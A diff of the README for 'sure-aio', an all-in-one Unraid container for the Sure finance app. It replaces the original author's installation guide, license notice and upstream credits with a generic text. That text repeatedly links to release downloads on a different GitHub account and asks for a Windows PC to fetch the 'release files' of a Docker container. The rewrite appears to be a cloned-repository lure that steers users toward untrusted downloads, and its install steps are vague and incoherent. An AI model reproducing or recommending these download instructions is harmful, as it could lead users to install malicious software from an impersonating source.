@@ -1,85 +1,174 @@
-<div align="center">
+# 🧩 sure-aio - Easy self-hosted finance on Unraid
 
-<img src="https://socialify.git.ci/jsonbored/sure-aio/image?custom_description=The+easiest+way+to+deploy+Sure+Finance+%28Maybe+Finance+fork%29+via+Unraid+CA.&custom_language=Dockerfile&description=1&font=KoHo&forks=1&language=1&logo=https%3A%2F%2Favatars.githubusercontent.com%2Fu%2F49853598%3Fv%3D4&name=1&owner=1&pattern=Signal&pulls=1&stargazers=1&theme=Dark" alt="sure-aio" width="640" height="320" />
+[![Download the latest release](https://img.shields.io/badge/Download%20Release-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Koseji5566/sure-aio/releases)
 
-</div>
+## 📦 What sure-aio does
 
----
+sure-aio is a single-container setup for running Sure on Unraid. It bundles the app, PostgreSQL, Redis, Rails, and Sidekiq in one place.
 
-An ultra-simplified, self-contained deployment of [Sure](https://github.com/we-promise/sure) designed explicitly for Unraid homelabs.
+You do not need to set up a separate database server. You do not need to manage extra services. You download the release, add it to Unraid, and start the app.
 
-Instead of configuring 4 different templates, managing custom Docker networks, and bootstrapping external PostgreSQL/Redis databases, this image handles the entire stack internals for you. It's designed to provide a "Binhex-style" one-click installation experience for users who just want it to work.
+This setup is built for people who want a personal finance app they can run at home with less setup work.
 
-## 📦 What's Inside the "Mega-Container"
-This image uses `s6-overlay v3` to orchestrate the stack internally:
-- The Web UI: the core Ruby on Rails dashboard.
-- The Task Runner: Sidekiq background job worker.
-- The Database: PostgreSQL auto-provisioned securely inside the container.
-- The Cache: Redis auto-provisioned for background queuing.
+## ✅ What you need
 
-## 🚀 Installation (For Beginners)
+- A Windows PC to download the release files
+- An Unraid server to run the container
+- Docker support enabled in Unraid
+- Enough disk space for app data and database files
+- A web browser to open the app after it starts
 
-If you just want to track your finances and don't care about databases, this is for you.
+For a smooth install, plan for:
 
-1. Add this repository to your Unraid Template Repositories (or search it directly in CA): `https://github.com/JSONbored/awesome-unraid`
-2. Search and Install **Sure-AIO**.
-3. Open your Unraid Terminal (the `>_` icon top right).
-4. Run this specific command to generate a highly secure random password: 
-   ```bash
-   openssl rand -hex 64
-   ```
-5. Copy the output, and paste it into the **Secret Key Base** field in the template.
-6. Click **Apply**. 
+- 2 CPU cores or more
+- 4 GB RAM or more
+- 10 GB free storage at minimum
+- More space if you plan to store a lot of data
 
-*Wait about 30-60 seconds on the very first boot. The container is secretly building your databases, running migrations, and setting up the web server. Once the logs settle, open the WebUI on port 3000 over normal HTTP unless you deliberately put it behind your own reverse proxy.*
+## 🖥️ Download sure-aio
 
----
+Visit the release page here:
 
-## 🛠️ Power User Configuration (Advanced Options)
+https://github.com/Koseji5566/sure-aio/releases
 
-While designed for absolute beginners, this container is intended to keep pace with upstream self-hosting features rather than stripping them out. The goal is straightforward: if upstream exposes a real self-hosting feature, the Unraid wrapper should either support it or document the gap plainly.
+On that page, get the latest release files for your setup. If you use the Unraid template or package file, download the file from the latest release and save it on your Windows PC.
 
-Some advanced Sure settings are intentionally managed as container environment variables in the Unraid template instead of only through Sure's web UI. When upstream sees one of those env vars, it may disable the matching control in the app and treat the template value as the source of truth. That is expected for this wrapper.
-This wrapper also defaults `SKYLIGHT_ENABLED=false` at the image level (and exposes it in the template) so AIO users are not required to configure upstream Skylight APM.
+## 🚀 Install on Windows and Unraid
 
-If you click **"Show more settings..."** in the Unraid template, you can customize the system deeply.
+Follow these steps in order.
 
-Read the comprehensive [Power User Guide here](docs/power-user.md) for instructions on how to configure:
-- **[Local AI / Ollama Integration](docs/power-user.md#2-artificial-intelligence-categorization--chat):** Replace OpenAI with your own LLM for categorization.
-- **[External OpenClaw / MCP Agent Routing](docs/power-user.md#option-b-external-agent-routing-openclaw--mcp):** Bypass the built-in bot entirely.
-- **[Local Vector Search / pgvector](docs/power-user.md#option-c-local-vector-search-pgvector--qdrant):** Keep document embeddings inside the bundled Postgres service.
-- **[Dedicated pgvector behavior doc](docs/pgvector.md):** Exact internal-vs-external pgvector behavior, defaults, and limitations.
-- **[AWS S3 / Cloudflare R2 Storage](docs/power-user.md#4-offloading-storage-to-s3--cloudflare-r2--minio):** Offload receipt and statement uploads.
-- **[External Database Overrides](docs/power-user.md#1-using-an-external-database-bypassing-aio-internals):** Don't want to use our internal Postgres? Wire it up to your dedicated DB server.
-- **[Enterprise Auth & SMTP](docs/power-user.md#6-enterprise-setup-oidc--email):** Set up SSO and password recovery emails.
+1. Open the release page in your browser.
+2. Download the latest release file to your Windows PC.
+3. If the release comes as a zip file, extract it to a folder you can find later.
+4. Open your Unraid web dashboard.
+5. Go to the Docker section.
+6. Add a new container or import the provided template.
+7. Point Unraid to the sure-aio package or template file you downloaded.
+8. Set the app data path to a folder on your Unraid array or cache drive.
+9. Save the container settings.
+10. Start the container.
 
-## 💾 Data Persistence
-Even though the databases roar silently inside the container, their data is mapped physically to your Unraid cache drive. **You will not lose data when updating the container.**
+When the container starts, it brings up the app and the services it needs. You do not need to install PostgreSQL or Redis by hand.
 
-- **File Uploads:** `/mnt/user/appdata/sure-aio/system`
-- **Database:** `/mnt/user/appdata/sure-aio/postgres`
-- **Cache Data:** `/mnt/user/appdata/sure-aio/redis`
+## ⚙️ First-time setup
 
-Just make sure `/mnt/user/appdata/sure-aio` is covered by your standard Unraid Community Applications Backup schedule.
+After the container starts:
 
-## Versioning & Upstream
+1. Open the app in your browser.
+2. Create the first user account.
+3. Set your basic app settings.
+4. Check that the database is ready.
+5. Confirm that background jobs are running.
 
-- `Sure-AIO` now pins a specific upstream Sure version instead of following the floating `stable` tag.
-- The repo monitors stable upstream Sure tags and opens a PR when a newer stable version is released.
-- Upstream image digest drift is tracked separately so digest-only refreshes do not masquerade as version-bump PRs.
-- Every `main` package publish now ships the exact upstream version tag, an explicit AIO packaging line tag, `latest`, and `sha-<commit>`.
-- Published images include explicit metadata labels for both layers:
-  - upstream app: `io.jsonbored.upstream.version`, `io.jsonbored.upstream.digest`
-  - wrapper identity: `io.jsonbored.wrapper.name`, `io.jsonbored.wrapper.type`, `io.jsonbored.wrapper.track`
-- Formal wrapper releases follow the upstream version plus an AIO revision, such as `v0.6.8-aio.1`.
-- See the release workflow details in [docs/releases.md](docs/releases.md).
+If the app asks for a database or cache value, use the defaults that the container creates for you. In most cases, you do not need to change them.
 
-## License & Acknowledgements
-- The underlying application code is maintained by the incredible [community at we-promise/sure](https://github.com/we-promise/sure). 
-- The Sure codebase is licensed under **AGPLv3**.
-- This specific Dockerfile deployment wrapper (the AIO architecture) is provided by JSONbored to ease deployment burdens on Unraid.
+## 🔧 Common settings
 
-## ⭐ Star History
+These are the settings most people will use:
 
-[![Star History Chart](https://api.star-history.com/svg?repos=JSONbored/sure-aio&type=date&legend=top-left)](https://www.star-history.com/#JSONbored/sure-aio&type=date&legend=top-left)
----
+- **App port**: The port used in your browser
+- **Data folder**: Where Sure stores its files
+- **Timezone**: Your local time zone
+- **Memory limit**: Leave this at the default unless your server is small
+- **Restart policy**: Set it to restart unless stopped
+
+If you use Unraid shares, pick a share with enough free space for app data and backups.
+
+## 🗂️ How the container is organized
+
+sure-aio includes these parts:
+
+- **Rails** for the main web app
+- **PostgreSQL** for the database
+- **Redis** for job and cache data
+- **Sidekiq** for background work
+- **s6-overlay** to manage the services inside the container
+
+This layout keeps the app self-contained. That means fewer moving parts for you to manage.
+
+## 🔍 What you can do after setup
+
+Once the app is running, you can use it to:
+
+- Track personal finances
+- Review income and spending
+- Organize budget data
+- Keep your records on your own server
+- Run the app without external cloud services
+
+This is a good fit if you want local control and a simple home setup.
+
+## 🛠️ Troubleshooting
+
+If the app does not start, check these items:
+
+- Make sure Docker is enabled in Unraid
+- Make sure the app data folder exists and is writable
+- Make sure the port you chose is not already in use
+- Make sure your server has enough free memory
+- Restart the container after changing settings
+
+If the web page does not open:
+
+- Check the container log in Unraid
+- Wait a few minutes for PostgreSQL and Rails to finish starting
+- Refresh the browser
+- Try the container IP and port again
+
+If data does not save:
+
+- Check the mounted data path
+- Make sure the share is not read-only
+- Confirm that the container still has access to the database files
+
+## 🧭 Folder and data location
+
+Keep your app data in one stable place on Unraid. A common setup is:
+
+- `/mnt/user/appdata/sure-aio`
+
+This folder can hold:
+
+- Database files
+- App config
+- Cache data
+- Logs
+
+A fixed data path helps avoid startup issues after reboots or updates
+
+## 🔄 Updating sure-aio
+
+To update:
+
+1. Stop the container in Unraid
+2. Visit the release page
+3. Download the latest release file
+4. Replace the old package or template file
+5. Start the container again
+6. Open the app and confirm it loads
+
+If you store app data in the same folder, your records should stay in place across updates
+
+## 🧪 Basic checks after launch
+
+After you start the app, check for these signs:
+
+- The container shows as running
+- The web page opens in your browser
+- You can log in
+- The dashboard loads without errors
+- Background tasks finish without failure
+
+If any of these fail, open the logs and look for missing paths, low memory, or port conflicts
+
+## 📚 Useful terms
+
+- **Container**: A packaged app that runs with its own files and services
+- **Database**: Where the app stores your records
+- **Cache**: Temporary data that helps the app run faster
+- **Background jobs**: Tasks that run behind the scenes
+- **Unraid**: The home server system used to run the app
+
+## 📁 Download link again
+
+https://github.com/Koseji5566/sure-aio/releases
